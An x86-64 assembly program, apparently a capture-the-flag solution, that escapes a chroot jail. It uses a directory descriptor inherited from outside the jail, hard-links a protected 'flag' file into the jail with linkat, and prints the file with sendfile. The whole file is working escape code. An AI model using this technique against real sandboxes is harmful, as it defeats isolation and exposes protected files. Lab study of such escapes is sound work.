.global _start
.intel_syntax noprefix

_start:
    # Open syscall to get dir_fd for '/'
    lea rdi, [rip + root_path]   # pathname for '/'
    xor rsi, rsi                 # flags (O_RDONLY)
    xor rdx, rdx                 # mode
    mov rax, 0x02                # syscall number for open
    syscall

    # Save the dir_fd
    mov r12, rax

    # Linkat syscall to create a link to 'flag'
    mov rdi, 3                   # olddirfd (3 because it was opened before chroot)
    lea rsi, [rip + old_path]    # oldpath (relative to olddirfd)
    mov rdx, r12                 # newdirfd (dir_fd for '/')
    lea r10, [rip + new_path]    # newpath (inside the jail)
    xor r8, r8                   # flags
    mov rax, 0x109               # syscall number for linkat
    syscall

    # Open syscall to open the new linked file
    lea rdi, [rip + new_file]    # pathname (new linked file inside the jail)
    xor rsi, rsi                 # flags (O_RDONLY)
    xor rdx, rdx                 # mode
    mov rax, 0x02                # syscall number for open
    syscall

    # Save the flag_fd
    mov r13, rax

    # Sendfile syscall to send the content of the file to stdout
    mov rdi, 1                   # out_fd (stdout)
    mov rsi, r13                 # in_fd (file descriptor returned by open)
    xor rdx, rdx                 # offset
    mov r10, 1000                # count (number of bytes to send)
    mov rax, 0x28                # syscall number for sendfile
    syscall

    # Exit syscall
    xor rdi, rdi                 # exit code
    mov rax, 0x3c                # syscall number for exit
    syscall

root_path:
    .string "/"

old_path:
    .string "flag"

new_path:
    .string "xxx"

new_file:
    .string "/xxx"
